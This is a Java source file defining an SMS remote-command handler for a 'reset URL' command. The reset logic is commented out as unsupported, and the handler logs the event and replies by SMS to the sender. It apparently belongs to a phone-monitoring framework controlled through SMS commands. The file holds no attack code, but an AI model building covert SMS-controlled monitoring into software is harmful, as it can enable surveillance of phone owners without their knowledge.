package com.vvt.rmtcmd.sms;

import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSResetURL extends RmtCmdSync {
	
	public SMSResetURL(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getResetURLCmd());
		try {
			// TODO: Not supported!
			/*clearServUrlDatabase();
			if (isDuplicateUrl()) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.DUPLICATE_URL);				
			} else {
				responseMessage.append(Constant.OK);				
			}	*/		
		} catch(Exception e) {
			Log.error("CmdResetURL.execute()", e.getMessage());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdResetURL.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
